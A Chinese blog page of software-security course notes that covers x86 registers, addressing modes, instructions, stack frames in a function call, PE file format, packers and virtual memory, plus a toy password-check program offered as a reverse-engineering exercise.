<li>ESI通常在内存操作指令中作为“源地址指针”使用，而EDI通常在内存操作指令中作为“目的地址指针”使用</li>
</ul></li>
<li>指针寄存器
<ul>
<li>用于存放堆栈内存储单元的偏移量，用它们可实现多种存储器操作数的寻址方式，不可以分割为8位寄存器</li>
<li>EBP为基指针(Base
Pointer)寄存器，通过它减去一定的偏移值，来访问栈中的元素</li>
<li>ESP为堆栈指针(Stack Pointer)寄存器，它始终指向栈顶</li>
</ul></li>
</ul></li>
<li>6个段寄存器：ES、CS、SS、DS、FS和GS
<ul>
<li>CS:代码段寄存器，其值为代码段的段值</li>
<li>DS:数据段寄存器，其值为数据段的段值</li>
<li>ES:附加段寄存器，其值为附加数据段的段值</li>
<li>SS:堆栈段寄存器，其值为堆栈段的段值</li>
<li>FS:附加段寄存器，其值为附加数据段的段值</li>
<li>GS:附加段寄存器，其值为附加数据段的段值</li>
</ul></li>
<li>指令指针寄存器EIP，标志寄存器EFlags
<ul>
<li>指令指针寄存器
<ul>
<li>存放下次将要执行的指令在代码段的偏移量。在计算机工作的时候，CPU会从IP中获得关于指令的相关内存地址，然后按照正确的方式取出指令，并将指令放置到原来的指令寄存器中</li>
</ul></li>
<li>标志寄存器
<ul>
<li><strong>Z-Flag</strong>(零标志)：它可以设成0或者1</li>
<li><strong>O-Flag</strong>(溢出标志)：反映有符号数加减运算是否溢出。如果运算结果超过了有符号数的表示范围，则OF置1，否则置0。例如：EAX的值为7FFFFFFFF，如果你此时再给EAX加1，OF寄存器就会被设置成1，因为此时EAX寄存器的最高有效位改变了</li>
<li><strong>C-Flag</strong>(进位标志)：用于反映运算是否产生进位或借位。如果运算结果的最高位产生一个进位或借位，则CF置1，否则置0。例，假如某寄存器值为FFFFFFFF，再加上1就会产生进位</li>
</ul></li>
</ul></li>
</ul>
<hr />
<h1 id="第二章-基础知识">第二章 基础知识</h1>
<h2 id="汇编寻址方式">汇编——寻址方式</h2>
<p>两种寻址方式：顺序寻址方式，跳跃寻址方式</p>
<h3 id="操作数寻址">操作数寻址</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV 目的操作数, 源操作数</span><br></pre></td></tr></table></figure>
<p>将源地址传到目标地址</p>
<p><strong>操作数寻址分类：</strong></p>
<p>1.<strong>立即寻址</strong>：指令的地址字段给出的不是操作数的地址，而是操作数本身，这种寻址方式称为立即寻址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV CL, 05H </span><br></pre></td></tr></table></figure>
<p>表示将05H传到CL寄存器中</p>
<p>2.<strong>直接寻址</strong>：在指令中直接给出操作数的有效地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,[3100H]</span><br></pre></td></tr></table></figure>
<p>表示将地址为[3100H]中的数据存储到AL中</p>
<p>默认的存储在数据段寄存器DS中，如果在前面标明了寄存器，那么就存到对应的寄存器中去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV AL, ES:[3100H]</span><br></pre></td></tr></table></figure>
<p>这个代码的意思就是将ES寄存器中地址为[3100H]的数据存储到AL寄存器中</p>
<p>3.<strong>间接寻址</strong>：指令地址字段中的形式地址不是操作数的真正地址，而是操作数地址的指示器，或者说此形式地址单元的内容才是操作数的有效地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV [BX], 12H</span><br></pre></td></tr></table></figure>
<p>这个代码表示，将12H这个数存储到DS:BX寄存器中</p>
<p>4.<strong>相对寻址</strong>：操作数的有效地址是一个基址寄存器（BX,
BP）或变址寄存器（SI, DI）的值加上指令中给定的偏移量之和</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV AX, [DI + 1234H]</span><br></pre></td></tr></table></figure>
<p>相对寻址就是在间接寻址的基础上增加了偏移量</p>
<p>5.<strong>基址变址寻址</strong>：将基址寄存器的内容，加上变址寄存器的内容而形成操作数的有效地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX, [EBX+ESI]</span><br></pre></td></tr></table></figure>
<p>或者也可以写成<code>MOV EAX, [BX][SI]</code>
或<code>MOV EAX, [SI][BX]</code></p>
<p>6.<strong>相对基址变址寻址</strong>：在基址变址寻址上加上偏移量即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX, [EBX+ESI+1000H]</span><br></pre></td></tr></table></figure>
<p>也可以写成<code>MOV EAX, 1000H [BX][SI]</code></p>
<h2 id="汇编主要指令">汇编——主要指令</h2>
<p>​ 指令一般有<strong>两个操作符、一个操作符、三个操作符</strong></p>
<p><strong>数据传送指令集：</strong></p>
<ul>
<li>MOV：把源操作数送给目的操作数，其语法为: MOV
目的操作数,源操作数</li>
<li>XCHG: 交换两个操作数的数据</li>
<li>PUSH,POP: 把操作数压入或取出堆栈</li>
<li>PUSHF,POPF,PUSHA,POPA: 堆栈指令群</li>
<li>LEA,LDS,LES: 取地址至寄存器
<ul>
<li>LEA：将有效地址传送到指定的寄存器</li>
<li><code>lea eax, dword ptr [4*ecx+ebx]</code> ，源数是地址
<code>[4*ecx+ebx]</code>
里的数值，<code>dword ptr</code>是说，地址中的数值是一个dword型的数据</li>
</ul></li>
</ul>
<p><strong>位运算指令集：</strong></p>
<ul>
<li>AND,OR,XOR,NOT,TEST: 执行BIT与BIT之间的逻辑运算</li>
<li>SHR,SHL,SAR,SAL: 移位指令</li>
<li>ROR,ROL,RCR,RCL: 循环移位指令</li>
</ul>
<p><strong>算数运算指令：</strong></p>
<ul>
<li>ADD,ADC：加法指令</li>
<li>SUB,SBB：减法指令</li>
<li>INC,DEC：把OP的值加一或者减一</li>
<li>NEG：将OP的符号反相，取二进制补码</li>
<li>MUL,IMUL：乘法指令</li>
<li>DIV,IDIV：除法指令</li>
</ul>
<p><strong>程序流程指令集：</strong></p>
<ul>
<li>CMP:比较两个操作数的大小关系</li>
<li>JMP:跳转到指定的地址</li>
<li>LOOP:循环指令</li>
<li>CALL,RET:子程序调用，返回指令（RET指令的功能是从一个代码区域中退出到调用CALL的指令处）</li>
<li>INT,IRET:中断调用，返回指令</li>
<li>REP,REPE,REPNE:重复前缀指令集</li>
</ul>
<p><strong>条件转移命令：</strong></p>
<p>JXX：当特定条件成立，就跳转到指定地址执行</p>
<ul>
<li>Z:为0则转移</li>
<li>G:大于则转移</li>
<li>L:小于则转移</li>
<li>E:等于则转移</li>
<li>N:取相反条件</li>
</ul>
<p><strong>字符串操作指令集：</strong></p>
<ul>
<li>字符串传送指令：MOVSB,MOVSW,MOVSD</li>
<li>字符串比较指令：CMPSB,CMPSW,CMPSD</li>
<li>字符串搜索指令：SCASB,SCASW</li>
<li>字符串载入或存贮指令：LODSB,LODSW,STOSB,STOSW</li>
</ul>
<h2 id="汇编函数调用示例">汇编——函数调用示例</h2>
<p>一个简单的函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> z=<span class="number">0</span>;</span><br><span class="line">	z=x+y;</span><br><span class="line">	<span class="keyword">return</span> z;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n=<span class="number">0</span>;</span><br><span class="line">	n=<span class="built_in">add</span>(<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Void main()</span><br><span class="line">&#123; ******************</span><br><span class="line">             int n=0;</span><br><span class="line">004114OE   mov         dword ptr [n],0</span><br><span class="line">             n=add(1,3);</span><br><span class="line">00411415   push         3</span><br><span class="line">00411417   push         1</span><br><span class="line">00411419   call            add(411096h)</span><br><span class="line">0041141E   add           esp,8</span><br><span class="line">00411421   mov          dwod ptr [n],eax</span><br><span class="line">      printf(“%d\n,n”);</span><br><span class="line">******************</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们对其进行分析</p>
<p>​ int n=0这一句没啥好说的，就是赋值，给n赋值0</p>
<p>​
下面执行函数块add，我们在执行call之前，还需要进行参数的入栈，将3和1都push到栈里面，我们得到栈区状态为：</p>
<p><img src="/images/软件安全/图片6.png" /></p>
<p>​ 我们在调用函数时需要使用<code>00411419 call add(411096h)</code></p>
<p>​
主要功能是，向栈中压入当前指令在内存中的位置，保存返回地址；跳转到调用函数的入口地址，就是函数的入口处，此时栈区的状态：</p>
<p><img src="/images/软件安全/图片7.png" /></p>
<p>下面分析add函数的汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Int  add (int  x,int  y)</span><br><span class="line">&#123;</span><br><span class="line">004113A0    push          ebp</span><br><span class="line">004113A1    mov           ebp,esp</span><br><span class="line">004113A3    sub            esp, 0CCh</span><br><span class="line">004113A9    push          ebx</span><br><span class="line">004113AA    push          esi</span><br><span class="line">004113AB    push          edi</span><br><span class="line">004113AC    lea             edi,[ebp-0CCh]</span><br><span class="line">004113B2    mov           ecx,33h</span><br><span class="line">004113B7    mov           eax,0CCCCCCCCh</span><br><span class="line">004113BC    rep stos    dword ptr  es:[edi]</span><br><span class="line">         int z=0;</span><br><span class="line">004113BE    mov           dword ptr [z],0</span><br><span class="line">         z=x+y;</span><br><span class="line">004113C5    mov           eax,dword ptr [x]</span><br><span class="line">004113C8    add            eax,dword ptr [y]</span><br><span class="line">004113CB    mov          dword ptr [z],eax</span><br><span class="line">        return z;</span><br><span class="line">004113CE    mov          eax,dword ptr[z]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先是<strong>栈帧的切换</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">004113A0    push          ebp</span><br><span class="line">004113A1    mov           ebp,esp</span><br><span class="line">004113A3    sub           esp, 0CCh</span><br></pre></td></tr></table></figure>
<p>​
这三句，首先将EBP的值入栈，将ESP赋值给EBP，然后再将ESP的值抬高0CCh，完成了栈帧的切换，保存了主函数栈帧的EBP的值，也通过改变两个寄存器的位置为add函数分配了栈帧空间</p>
<p><img src="/images/软件安全/图片8.png" /></p>
<p>然后是<strong>函数状态的保存</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">004113A9    push          ebx</span><br><span class="line">004113AA    push          esi</span><br><span class="line">004113AB    push          edi</span><br><span class="line">004113AC    lea           edi,[ebp-0CCh]</span><br></pre></td></tr></table></figure>
<p>​
这几句代码，用于保存<code>ebx，esi，edi</code>寄存器的位置，将ebp寄存器抬升0CCh来装入EDI</p>
<p>​
然后是栈帧的切换，后面的就是将33个4字节的位置都初始化为<code>0CCCCCCCCh</code></p>
<p>​
然后我们就可以执行函数体了，完成1+3的加法，并将结果存储在eax寄存器中</p>
<p><img src="/images/软件安全/图片9.png" /></p>
<p>​
执行完加法后，我们需要恢复栈帧的状态到main函数，后面几句实现了恢复的过程：首先恢复<code>edi，esi，ebx</code>寄存器的值，然后<code>mov esp,ebp</code>
这一句是恢复了esp寄存器的值，后面一句恢复了ebp寄存器的值，最后ret表示根据返回地址来恢复EIP寄存器的值，相当于<code>pop EIP</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://luhaozhhhe.github.io/2024/11/05/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0Chapter3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Welcome To Luhaozhhhe's Blog!">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2024/11/05/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0Chapter3/" itemprop="url">软件安全笔记Chapter3</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2024-11-05T11:07:23+08:00">
                2024-11-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
                    <span itemprop="name">课程笔记</span>
                  </a>
                </span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
                    <span itemprop="name">软件安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="第三章-调试分析工具">第三章 调试分析工具</h1>
<h2 id="pe文件格式">PE文件格式</h2>
<p>一般有可执行文件（exe&amp;dll）</p>
<p>PE文件格式将可执行文件分成了若干个数据节，不同类型的资源被放在不同的节中</p>
<p>一般来说，有以下的数据节：</p>
<ul>
<li>rsrc：存放<strong>程序的资源</strong>，如图标、菜单等</li>
<li>text：存放着<strong>二进制的机器代码</strong></li>
<li>idata：可执行文件所使用的动态链接库<strong>等外来函数与文件的信息</strong>,
即输入表</li>
<li>data：初始化的数据块</li>
</ul>
<p><strong>加壳</strong></p>
<p>​ 全称应该是可执行程序资源压缩，是保护文件的常用手段。
加壳过的程序可以直接运行，但是不能查看源代码。要经过脱壳才可以查看源代码。</p>
<p>​ 加壳可以很好的防止对程序的非法修改和静态反编译</p>
<p>加壳工具：压缩壳和加密壳</p>
<ul>
<li>压缩壳的特点是减小软件体积大小，加密保护不是重点</li>
<li>加密壳种类比较多，不同的壳侧重点不同，一些壳单纯保护程序，另一些壳提供额外的功能，如提供注册机制、使用次数、时间限制等</li>
</ul>
<h2 id="虚拟内存">虚拟内存</h2>
<p>​
用户在用户模式运行；操作系统在内核模式运行，在内核模式可以访问所有的内存和硬件，使用所有的处理器指令。</p>
<p><strong>物理内存&amp;虚拟内存</strong></p>
<p>​
一般用户模式下，看到的都是虚拟内存，程序进行虚地址到实地址的转换的过程我们称为<strong>程序的再定位</strong></p>
<p>​
在运行PE文件时，操作系统会自动加载该文件到内存，并为其映射出4GB的虚拟存储空间，然后继续运行，这就形成了所谓的进程空间，在这个空间中定位的地址称为<strong>虚拟内存地址（Virtual
Address，VA）</strong>。</p>
<p>​
我们在PE文件中看到的指令是相对于磁盘文件而言的，文件偏移的话，我们还需要知道这条指令在内存中所处的位置，就是虚拟内存地址；在调试的时候看到虚拟内存的话，我们也需要找回该指令的机器码</p>
<p><strong>几个重要概念</strong></p>
<ul>
<li>相对虚拟地址：内存地址相对于映射基址的偏移量</li>
<li>文件偏移地址：数据在PE文件中的地址叫文件偏移地址，这是文件在磁盘上存放时相对于文件开头的偏移</li>
<li>装载基址：PE装入内存时的基地址。默认情况下，EXE文件在内存中的基地址是0x00400000，DLL文件是0x10000000</li>
<li>虚拟内存地址：PE文件中的指令被装入内存后的地址</li>
</ul>
<p><img src="/images/软件安全/图片10.png" /></p>
<p>​
PE文件的数据节的大小永远是0x200的整数倍；内存中的节总是0x1000的整数倍</p>
<p>​ 我们可以使用Lord PE来查看内存地址和数据在PE文件中的地址</p>
<h2 id="调试分析工具">调试分析工具</h2>
<ul>
<li>OllyDbg——动态调试</li>
<li>IDA PRO——逆向分析</li>
</ul>
<h2 id="软件破解示例">软件破解示例</h2>
<p>给一个简单的密码程序</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> password <span class="string">&quot;12345678&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">verifyPwd</span><span class="params">(<span class="type">char</span> * pwd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> flag;</span><br><span class="line">	flag=<span class="built_in">strcmp</span>(password, pwd);</span><br><span class="line">	<span class="keyword">return</span> flag==<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">bool</span> bFlag;</span><br><span class="line">	<span class="type">char</span> pwd[<span class="number">1024</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;please input your password:\n&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,pwd);</span><br><span class="line">		bFlag=<span class="built_in">verifyPwd</span>(pwd);</span><br><span class="line">		<span class="keyword">if</span> (bFlag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;passed\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;wrong password, please input again:\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们需要破解debug模式下的exe程序</p>
<p>我们可以利用逻辑条件的修改、或者直接将判定密码的语句给置空就可以了</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/">
              
                  <span class="site-state-item-count">42</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Luhaozhhhe</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>






    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
  


  

  

</body>
</html>
